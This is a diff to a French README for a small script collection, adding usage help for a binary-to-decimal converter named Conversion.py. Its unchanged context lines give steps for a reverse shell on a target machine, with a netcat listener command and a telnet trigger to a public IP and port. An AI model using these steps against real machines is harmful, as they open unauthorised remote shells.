@@ -16,5 +16,20 @@ Le script swipedns.sh permet juste de définir 2 variables DNS1 et DNS2 dans son
 3) Exécuter le listener sur votre machine: 'nc -l -p 6666' pour écouter la future connexion de la machine cible.              
 4) Lancer la commande d'activation du revershell distant: 'telnet $ip_publique_machine $port' (à remplacer par le port défini dans le script --> 8700 dans notre cas).
 
+# Conversion.py
+
+Usage:
+Conversion.py -b 10110001
+Conversion.py -d 162
+
+Outil permettant de convertir un nombre binaire en decimal, et vice-versa
+
+Options:
+  -h, --help            show this help message and exit
+  -b BINAIRE, --binaire=BINAIRE
+                        Nombre a convertir au format decimal
+  -d DECI, --decimal=DECI
+                        Nombre a convertir au format binaire
+
 
 Enjoy! :)
